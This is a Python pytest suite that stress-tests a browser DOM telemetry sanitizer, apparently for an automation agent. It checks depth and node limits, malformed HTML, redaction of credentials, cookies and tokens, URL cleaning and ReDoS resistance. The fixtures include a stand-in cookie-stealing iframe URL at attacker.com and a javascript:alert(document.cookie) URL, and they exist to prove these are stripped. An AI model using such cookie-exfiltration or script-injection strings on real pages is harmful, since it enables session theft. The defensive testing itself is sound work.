"""Adversarial stress-testing for browser DOM telemetry diagnostics and sanitization.

Covers:
- Deep recursion / nesting (>100 levels) in HTML and dictionaries
- Massive sibling fan-out (>1,000 nodes) and node budget enforcement
- Malformed, fragmented, mismatched, and null-byte-laden HTML
- Mixed-case, compound, and obfuscated credential / token / cookie attributes
- Credential-rich, basic-auth, IPv6, relative, and malformed URLs
- ReDoS resistance and large payload text sanitization
- DOMTelemetryRecord JSON serialization invariance under adversarial conditions
"""

from __future__ import annotations

import json
import time
from pathlib import Path
from typing import Any
from unittest.mock import AsyncMock, MagicMock

import pytest

from agent.browser.telemetry import (
    DOMTelemetryRecord,
    capture_dom_telemetry,
    count_nodes,
    sanitize_dom_tree,
    sanitize_text,
    sanitize_url,
)

# ============================================================================
# Vector 1: Deep Nesting & Recursion Limits
# ============================================================================


def test_adversarial_deeply_nested_html_150_levels() -> None:
    """Ensure HTML with 150 nested divs does not crash and enforces max_depth <= 10."""
    nested_html = "<div>" * 150 + "<span>Deep Leaf</span>" + "</div>" * 150

    start = time.perf_counter()
    tree = sanitize_dom_tree(nested_html)
    elapsed = time.perf_counter() - start

    assert elapsed < 0.2, f"Deep HTML parsing took too long: {elapsed:.3f}s"
    assert tree["tag"] == "div"

    # Verify structural depth invariant
    depth = 0
    curr: dict[str, Any] | None = tree
    while curr and "children" in curr and curr["children"]:
        depth += 1
        curr = curr["children"][0]

    assert depth <= 10, f"Max depth exceeded: {depth} > 10"


def test_adversarial_deeply_nested_dict_150_levels() -> None:
    """Ensure dictionary with 150 nested levels does not hit Python RecursionError."""
    root: dict[str, Any] = {"tag": "div", "attrs": {"id": "level-0"}, "children": []}
    curr = root
    for i in range(1, 150):
        child = {"tag": "div", "attrs": {"id": f"level-{i}"}, "children": []}
        curr["children"] = [child]
        curr = child

    start = time.perf_counter()
    sanitized = sanitize_dom_tree(root)
    elapsed = time.perf_counter() - start

    assert elapsed < 0.1, f"Deep dict sanitization took too long: {elapsed:.3f}s"
    assert sanitized["tag"] == "div"

    # Count depth
    depth = 0
    node: dict[str, Any] | None = sanitized
    while node and "children" in node and node["children"]:
        depth += 1
        node = node["children"][0]

    assert depth <= 10, f"Depth exceeded 10 in sanitized dict: {depth}"
    assert count_nodes(sanitized) <= 11


def test_adversarial_deeply_nested_unclosed_tags() -> None:
    """Ensure deeply nested HTML without closing tags parses safely without hanging."""
    unclosed_html = "".join(f"<div id='node-{i}'>" for i in range(120)) + "text"
    tree = sanitize_dom_tree(unclosed_html)

    assert tree["tag"] == "div"
    assert count_nodes(tree) <= 11


# ============================================================================
# Vector 2: Massive Sibling Fan-Out & Node Budgets
# ============================================================================


def test_adversarial_massive_sibling_nodes_html_2000_nodes() -> None:
    """Ensure HTML with 2,000 sibling tags is strictly bounded by max_children and max_nodes."""
    children_html = "".join(f"<p class='card' id='p-{i}'>Text {i}</p>" for i in range(2000))
    full_html = f"<div class='feed'>{children_html}</div>"

    start = time.perf_counter()
    tree = sanitize_dom_tree(full_html)
    elapsed = time.perf_counter() - start

    assert elapsed < 0.5, f"Massive sibling HTML parsing took too long: {elapsed:.3f}s"
    assert tree["tag"] == "div"

    children = tree.get("children", [])
    # max_children is 50
    assert len(children) <= 50, f"max_children exceeded: {len(children)} > 50"

    total_count = count_nodes(tree)
    assert total_count <= 500, f"max_nodes exceeded: {total_count} > 500"


def test_adversarial_massive_sibling_nodes_dict_2000_nodes() -> None:
    """Ensure dictionary with 2,000 sibling nodes enforces max_children and max_nodes."""
    raw_dict = {
        "tag": "div",
        "children": [{"tag": "span", "attrs": {"id": f"span-{i}"}} for i in range(2000)],
    }

    start = time.perf_counter()
    sanitized = sanitize_dom_tree(raw_dict)
    elapsed = time.perf_counter() - start

    assert elapsed < 0.2, f"Massive dict sanitization took too long: {elapsed:.3f}s"
    assert len(sanitized.get("children", [])) <= 50
    assert count_nodes(sanitized) <= 51


def test_adversarial_wide_and_deep_tree_enforces_budget() -> None:
    """Ensure wide and deep tree (10 children per node, 4 levels = 1,111 nodes) caps at 500 nodes."""

    def build_tree(level: int) -> dict[str, Any]:
        node: dict[str, Any] = {"tag": "div", "attrs": {"id": f"lvl-{level}"}}
        if level < 4:
            node["children"] = [build_tree(level + 1) for _ in range(10)]
        return node

    large_tree = build_tree(0)
    sanitized = sanitize_dom_tree(large_tree)

    node_count = count_nodes(sanitized)
    assert node_count <= 500, f"Node count cap breached: {node_count} > 500"


# ============================================================================
# Vector 3: Malformed & Broken HTML Fragments
# ============================================================================


def test_adversarial_malformed_mismatched_tags() -> None:
    """Ensure severely mismatched tags are handled gracefully."""
    mismatched = "<div><section><span></i></b></div></section><p>Valid after</p></div></div></div>"
    tree = sanitize_dom_tree(mismatched)
    assert isinstance(tree, dict)
    assert "tag" in tree


def test_adversarial_malformed_unclosed_attributes_and_null_bytes() -> None:
    """Ensure null bytes, raw control chars, and unclosed attribute quotes don't crash."""
    malformed = (
        "<div class='test\x00\x01\x02' data-attr=\"unclosed string"
        "<span id=raw_id>text\x00with\x00nulls</span>"
        "<div <tag> <> </>>"
    )
    tree = sanitize_dom_tree(malformed)
    assert isinstance(tree, dict)
    assert "tag" in tree


def test_adversarial_malformed_broken_entities_and_angles() -> None:
    """Ensure broken entity references and raw angle brackets don't trigger parser exceptions."""
    broken = (
        "<div>&unknown_entity; & < > ' \" &#999999999; &#xZZZ;"
        "<div id='valid'><span>Inner &amp; outer</span></div></div>"
    )
    tree = sanitize_dom_tree(broken)
    assert isinstance(tree, dict)
    assert tree["tag"] == "div"


def test_adversarial_weird_casing_and_custom_tags() -> None:
    """Ensure mixed casing, uppercase tags, custom web components, and numeric tags work."""
    weird_html = (
        "<DIV CLASS='MAIN' ROLE='NAVIGATION'>"
        "<CUSTOM-FEED-ITEM-V2 DATA-ID='123'>"
        "<H1>Title</H1>"
        "</CUSTOM-FEED-ITEM-V2>"
        "</DIV>"
    )
    tree = sanitize_dom_tree(weird_html)
    assert tree["tag"] == "div"
    assert "MAIN" in tree.get("classes", [])
    assert tree.get("role") == "NAVIGATION"


def test_adversarial_empty_whitespace_and_null_inputs() -> None:
    """Ensure empty or whitespace-only HTML/dict returns fallback empty structure."""
    assert sanitize_dom_tree("") == {"tag": "empty", "classes": [], "attrs": {}}
    assert sanitize_dom_tree("   \n\t   ") == {"tag": "empty", "classes": [], "attrs": {}}
    assert sanitize_dom_tree({}) == {"tag": "empty", "classes": [], "attrs": {}}
    assert sanitize_dom_tree({"structure": {}}) == {"tag": "empty", "classes": [], "attrs": {}}


# ============================================================================
# Vector 4: Mixed-Case, Obfuscated, and Nested Credential Attributes
# ============================================================================


def test_adversarial_mixed_case_sensitive_attrs() -> None:
    """Ensure case variations of sensitive keywords are unconditionally redacted."""
    html = """
    <div PassWord="SecretVal"
         DATA-AUTH-TOKEN="Bearer 12345"
         cOoKiE_Id="sess-999"
         X-API-KEY="my-secret-key"
         SeCrEt="classified">
      <span normal="safe">Text</span>
    </div>
    """
    tree = sanitize_dom_tree(html)
    attrs = tree.get("attrs", {})

    # All sensitive attribute names must be redacted
    for name in ["password", "data-auth-token", "cookie_id", "x-api-key", "secret"]:
        assert name in attrs, f"Missing attribute {name}"
        assert attrs[name] == "[REDACTED]", f"Attribute {name} leaked: {attrs[name]}"


def test_adversarial_sensitive_values_in_safe_attrs() -> None:
    """Ensure sensitive keywords in values of data-*, aria-*, id, href, etc. get redacted."""
    html = """
    <div id="user_session_container"
         data-target="auth_token_refresh"
         aria-describedby="password_hint"
         href="/api/v1/auth?token=supersecret"
         title="My Secret Dashboard">
      Content
    </div>
    """
    tree = sanitize_dom_tree(html)
    attrs = tree.get("attrs", {})

    assert attrs.get("id") == "[REDACTED]"
    assert attrs.get("data-target") == "[REDACTED]"
    assert attrs.get("aria-describedby") == "[REDACTED]"
    assert attrs.get("href") == "[REDACTED]"
    assert attrs.get("title") == "[REDACTED]"


def test_adversarial_classes_stripping_sensitive_keywords() -> None:
    """Ensure sensitive tokens in class lists are thoroughly expunged."""
    html = (
        "<div class='feed-card AUTH-CONTAINER session_badge "
        "user-password-field normal-card secondary-btn-secret'>"
        "</div>"
    )
    tree = sanitize_dom_tree(html)
    classes = tree.get("classes", [])

    assert "feed-card" in classes
    assert "normal-card" in classes
    # All containing auth, session, password, secret must be stripped
    assert not any("auth" in c.lower() for c in classes)
    assert not any("session" in c.lower() for c in classes)
    assert not any("password" in c.lower() for c in classes)
    assert not any("secret" in c.lower() for c in classes)


def test_adversarial_input_values_always_redacted() -> None:
    """Verify input value redaction regardless of attribute order."""
    # Attribute order 1: value before name/type
    html1 = '<input value="secret_value_123" name="password" type="text">'
    tree1 = sanitize_dom_tree(html1)
    val1 = tree1.get("attrs", {}).get("value")
    assert val1 in {"[REDACTED_PASSWORD]", "[REDACTED_VALUE]"}
    assert "secret_value_123" not in json.dumps(tree1)

    # Attribute order 2: type=password first
    html2 = '<input type="password" value="my_plain_password">'
    tree2 = sanitize_dom_tree(html2)
    val2 = tree2.get("attrs", {}).get("value")
    assert val2 == "[REDACTED_PASSWORD]"
    assert "my_plain_password" not in json.dumps(tree2)

    # Dict representation check
    dict_node = {
        "tag": "input",
        "attrs": {
            "value": "super_token_999",
            "name": "access_token",
            "type": "text",
        },
    }
    tree3 = sanitize_dom_tree(dict_node)
    val3 = tree3.get("attrs", {}).get("value")
    assert val3 == "[REDACTED_PASSWORD]"
    assert "super_token_999" not in json.dumps(tree3)


def test_adversarial_excluded_tags_even_when_unclosed_or_nested() -> None:
    """Ensure script, style, svg, iframe are never leaked even with weird casing or nesting."""
    html = """
    <div>
      <SCRIPT type="text/javascript">
        const secret = "should_never_leak_in_telemetry";
        alert(secret);
      </SCRIPT>
      <STYLE>
        .secret-class { display: none; }
      </STYLE>
      <IFRAME src="https://attacker.com/steal?cookie=123"></IFRAME>
      <SVG>
        <g><path d="M0 0" id="secret_svg_path"/></g>
      </SVG>
      <p id="safe-paragraph">Safe Content</p>
    </div>
    """
    tree = sanitize_dom_tree(html)
    tree_str = json.dumps(tree)

    assert "should_never_leak_in_telemetry" not in tree_str
    assert "secret-class" not in tree_str
    assert "attacker.com" not in tree_str
    assert "secret_svg_path" not in tree_str
    assert "safe-paragraph" in tree_str


# ============================================================================
# Vector 5: Complex URLs with Credentials & Parameters
# ============================================================================


@pytest.mark.parametrize(
    "raw_url, forbidden, expected_substring",
    [
        # Standard user:pass basic auth
        (
            "https://user:password123@linkedin.com/in/test",
            ["password123", "user:"],
            "https://linkedin.com/in/test",
        ),
        # Basic auth with special characters and URL encoded userinfo
        (
            "http://admin%40corp:P%40%24%24w0rd%21@intranet.local:8080/feed?token=xyz",
            ["P%40%24%24w0rd", "P@$$w0rd", "admin%40corp"],
            "http://intranet.local:8080/feed?",
        ),
        # Empty user with password
        (
            "https://:secret_pass@example.com/api",
            ["secret_pass"],
            "https://example.com/api",
        ),
        # Empty password with user
        (
            "https://myuser:@example.com/api",
            ["myuser:"],
            "https://example.com/api",
        ),
        # Token in query param
        (
            "https://linkedin.com/feed/?trk=nav&oauth_token=secret_oauth_abc&session_id=9876",
            ["secret_oauth_abc", "9876"],
            "oauth_token=",
        ),
        # IPv6 address with userinfo and port
        (
            "http://usr:pwd@[::1]:8080/feed?api_key=mykey123",
            ["pwd", "usr:", "mykey123"],
            "http://[::1]:8080/feed?",
        ),
        # URL fragment with sensitive tokens (should be dropped)
        (
            "https://linkedin.com/feed/#access_token=super_secret_hash",
            ["super_secret_hash", "access_token"],
            "https://linkedin.com/feed/",
        ),
        # Multiple sensitive and non-sensitive params
        (
            "https://host.com/p?safe=1&auth=2&token=3&keep=4&secret=5",
            ["auth=2", "token=3", "secret=5"],
            "safe=1",
        ),
    ],
)
def test_adversarial_sanitize_url_robustness(
    raw_url: str,
    forbidden: list[str],
    expected_substring: str,
) -> None:
    """Ensure sanitize_url completely eliminates userinfo and sensitive query params."""
    sanitized = sanitize_url(raw_url)
    for term in forbidden:
        assert term not in sanitized, f"Forbidden term '{term}' found in '{sanitized}'"
    assert expected_substring in sanitized or "[REDACTED]" in sanitized


def test_adversarial_sanitize_url_malformed_and_extreme_inputs() -> None:
    """Ensure malformed, control character, and massive URLs don't throw unhandled exceptions."""
    # Malformed / unparseable
    assert sanitize_url("http://[invalid-ipv6/path") == "[UNPARSEABLE_URL]"
    assert sanitize_url("javascript:alert(document.cookie)") != ""
    assert sanitize_url("") == ""

    # Giant URL (10,000 chars)
    giant_url = "https://linkedin.com/feed?" + "&".join(f"param{i}=val{i}" for i in range(500))
    sanitized = sanitize_url(giant_url)
    assert "param0=val0" in sanitized
    assert "linkedin.com" in sanitized


# ============================================================================
# Vector 6: Text Sanitization & ReDoS Resistance
# ============================================================================


def test_adversarial_sanitize_text_redos_resistance() -> None:
    """Stress regex engine with worst-case backtracking strings for email/phone."""
    # Pathological email prefix (many dots and pluses)
    bad_email_pattern = "a" * 5000 + "@" + "b" * 5000 + ".com"
    start = time.perf_counter()
    res1 = sanitize_text(bad_email_pattern)
    elapsed1 = time.perf_counter() - start
    assert elapsed1 < 0.1, f"Email regex too slow: {elapsed1:.3f}s"
    assert "[REDACTED_EMAIL]" in res1

    # Pathological phone number pattern (repeated digits, hyphens, parentheses)
    bad_phone_pattern = "+1" + "-000" * 1000 + "(999)" * 500 + " 123-456-7890"
    start = time.perf_counter()
    res2 = sanitize_text(bad_phone_pattern)
    elapsed2 = time.perf_counter() - start
    assert elapsed2 < 0.1, f"Phone regex too slow: {elapsed2:.3f}s"
    assert "[REDACTED_PHONE]" in res2


def test_adversarial_sanitize_text_large_text_truncation() -> None:
    """Ensure huge text payloads are handled efficiently in DOM tree parsing."""
    huge_text = "Word " * 20000  # 100,000 characters
    html = f"<div><p>{huge_text}</p></div>"

    start = time.perf_counter()
    tree = sanitize_dom_tree(html)
    elapsed = time.perf_counter() - start

    assert elapsed < 0.2
    # Text must be truncated to <= 100 chars
    p_node = tree.get("children", [{}])[0]
    assert len(p_node.get("text", "")) <= 100


# ============================================================================
# Vector 7: DOMTelemetryRecord Pydantic Schema Invariance Under Stress
# ============================================================================


def test_adversarial_dom_telemetry_record_serialization() -> None:
    """Ensure record serializes cleanly to valid JSON under stress structures."""
    structure = {
        "tag": "div",
        "classes": ["a" * 50 for _ in range(20)],
        "attrs": {f"data-{i}": "v" * 150 for i in range(30)},
        "text": "T" * 100,
        "children": [
            {
                "tag": "span",
                "classes": ["child"],
                "attrs": {"role": "button"},
                "text": "Click me",
            }
        ],
    }

    record = DOMTelemetryRecord(
        trigger="test_adversarial_drift",
        url_sanitized="https://linkedin.com/feed",
        target_selector="div.a > span.child",
        item_id="adversarial-item-001",
        node_count=2,
        structure=structure,
    )

    serialized = record.model_dump_json(indent=2)
    assert isinstance(serialized, str)

    # Roundtrip validation
    loaded = json.loads(serialized)
    assert loaded["telemetry_version"] == "1.0"
    assert loaded["trigger"] == "test_adversarial_drift"
    assert loaded["node_count"] == 2
    assert loaded["structure"]["tag"] == "div"


# ============================================================================
# Vector 8: End-to-End capture_dom_telemetry Non-Blocking Verification
# ============================================================================


@pytest.mark.asyncio
async def test_adversarial_capture_dom_telemetry_with_adversarial_page(
    tmp_path: Any,
) -> None:
    """Ensure capture_dom_telemetry writes valid sanitized JSON even when page returns adversarial data."""
    mock_page = MagicMock()
    mock_page.url = "https://user:password@www.linkedin.com/feed/?auth_token=super_secret&trk=nav"

    # In-browser JS returns adversarial structure with sensitive fields
    adversarial_eval_result = {
        "structure": {
            "tag": "div",
            "classes": ["feed", "auth-token-card"],
            "attrs": {
                "id": "card-1",
                "password": "leak_password",
                "data-secret": "leak_secret",
            },
            "children": [
                {
                    "tag": "script",
                    "text": "eval('secret')",
                },
                {
                    "tag": "input",
                    "attrs": {"type": "password", "value": "top_secret_pass"},
                },
            ],
        },
        "node_count": 3,
    }
    mock_page.evaluate = AsyncMock(return_value=adversarial_eval_result)

    telemetry_path = await capture_dom_telemetry(
        page=mock_page,
        trigger="adversarial_test_trigger",
        telemetry_dir=tmp_path,
        target_selector="div.feed",
        item_id="item-adv-1",
        timeout_seconds=2.0,
    )

    assert telemetry_path is not None
    saved_file = tmp_path / Path(telemetry_path).name
    assert saved_file.exists()

    content = json.loads(saved_file.read_text(encoding="utf-8"))
    assert content["trigger"] == "adversarial_test_trigger"
    assert "password@" not in content["url_sanitized"]
    assert "super_secret" not in content["url_sanitized"]

    tree_str = json.dumps(content["structure"])
    assert "leak_password" not in tree_str
    assert "leak_secret" not in tree_str
    assert "top_secret_pass" not in tree_str
    assert "script" not in tree_str
    assert "[REDACTED_PASSWORD]" in tree_str
